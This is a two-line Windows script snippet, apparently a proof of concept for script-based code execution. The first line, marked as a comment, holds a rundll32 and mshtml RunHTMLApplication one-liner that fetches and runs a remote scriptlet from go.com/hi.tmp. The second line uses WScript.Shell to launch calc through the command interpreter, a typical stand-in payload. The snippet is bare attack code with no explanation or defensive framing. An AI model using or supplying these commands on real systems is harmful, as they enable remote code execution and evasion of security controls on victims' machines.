rem rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";document.write();GetObject("script"+":"+"https://go.com/hi.tmp")
CreateObject("WScript.Shell").Run "%COMSPEC% /c calc"
